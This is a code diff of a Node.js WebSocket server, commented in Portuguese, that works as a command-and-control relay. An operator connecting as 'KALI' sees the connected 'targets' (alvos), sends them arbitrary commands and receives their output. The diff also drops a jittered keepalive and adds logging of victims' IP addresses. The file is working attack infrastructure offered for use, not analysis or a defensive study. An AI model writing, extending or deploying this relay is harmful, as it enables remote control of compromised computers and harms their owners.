@@ -1,67 +1,62 @@
-// index.js  – package.json precisa apenas: {"dependencies":{"ws":"^8.18"}}
-const crypto = require('crypto');
 const WebSocket = require('ws');
-const http    = require('http');
+const http = require('http');
 
-const PORT     = process.env.PORT || 10000;
-const server   = http.createServer((_,r)=>r.end('OK'));
-const wss      = new WebSocket.Server({ server });
+const PORT = process.env.PORT || 10000;
+const server = http.createServer((_, r) => r.end('Shadow Relay v2 Online'));
+const wss = new WebSocket.Server({ server });
 
-const KALI     = new Map();          // socket → id
-const BOT      = new Map();          // id    → socket
-const DOMAINS  = (process.env.DOMAINS || '').split(',').filter(Boolean);
-const JITTER   = () => 15000 + Math.floor(Math.random()*10000); // 15-25 s
+const KALI = new Map(); 
+const BOT = new Map();
 
-function safeStringify(obj){
-  try{ return JSON.stringify(obj); }catch{return '{}';}
+// Função para gerar logs visíveis no painel do Render
+function logger(msg) {
+    const agora = new Date().toLocaleString('pt-BR');
+    console.log(`[${agora}] ${msg}`);
 }
 
-function broadcast(toMap, obj){
-  const msg = safeStringify(obj);
-  toMap.forEach((s)=>{ if(s.readyState===1) s.send(msg); });
-}
+wss.on('connection', (ws, req) => {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const p = new URLSearchParams(req.url.split('?')[1]);
+    const who = p.get('id');
 
-wss.on('connection', (ws,req)=>{
-  const p   = new URLSearchParams(req.url.split('?')[1]);
-  const who = p.get('id');
-  if(!who) return ws.close(1002);
+    if (!who) return ws.close(1002);
 
-  if(who === 'KALI'){
-    KALI.set(ws, who);
-    BOT.forEach((_,id)=>{
-      ws.send(safeStringify({t:'bot',s:'on',id}));
-    });
-  }else{
-    BOT.set(who, ws);
-    broadcast(KALI, {t:'bot',s:'on',id:who});
-  }
-
-  ws.on('message', (data)=>{
-    try{
-      const j = JSON.parse(data);
-      if(KALI.has(ws)){               // KALI → BOT
-        const b = BOT.get(j.to);
-        if(b && b.readyState===1) b.send(j.cmd);
-      }else{                          // BOT → KALI
-        broadcast(KALI, {t:'res',f:who,d:j.out});
-      }
-    }catch{}
-  });
-
-  ws.on('close', ()=>{
-    if(KALI.has(ws)){
-      KALI.delete(ws);
-    }else{
-      BOT.forEach((v,k)=> v===ws ? BOT.delete(k) : 0);
-      broadcast(KALI, {t:'bot',s:'off',id:who});
+    if (who === 'KALI') {
+        KALI.set(ws, who);
+        logger(`[+] OPERADOR CONECTADO: Kali Linux de ${ip}`);
+        BOT.forEach((_, id) => ws.send(JSON.stringify({ t: 'bot', s: 'on', id })));
+    } else {
+        BOT.set(who, ws);
+        logger(`[*] ALVO CONECTADO: ${who} [IP: ${ip}]`);
+        // Avisa o Kali que um novo alvo entrou
+        KALI.forEach((s) => s.send(JSON.stringify({ t: 'bot', s: 'on', id: who })));
     }
-  });
+
+    ws.on('message', (data) => {
+        try {
+            const j = JSON.parse(data);
+            if (KALI.has(ws)) { 
+                // Kali enviando comando para o bot
+                const b = BOT.get(j.to);
+                if (b) b.send(j.cmd);
+            } else {
+                // Bot enviando resposta para o Kali
+                const msg = JSON.stringify({ t: 'res', f: who, d: j.out });
+                KALI.forEach((s) => s.send(msg));
+            }
+        } catch (e) { }
+    });
+
+    ws.on('close', () => {
+        if (KALI.has(ws)) {
+            KALI.delete(ws);
+            logger(`[-] OPERADOR DESCONECTADO`);
+        } else {
+            BOT.delete(who);
+            logger(`[!] ALVO OFFLINE: ${who}`);
+            KALI.forEach((s) => s.send(JSON.stringify({ t: 'bot', s: 'off', id: who })));
+        }
+    });
 });
 
-setInterval(()=>{
-  wss.clients.forEach(s=>s.ping());
-}, JITTER());
-
-server.listen(PORT, ()=>{
-  /* sem console em produção */
-});
+server.listen(PORT, () => logger(`SERVIDOR ESCUTANDO NA PORTA ${PORT}`));
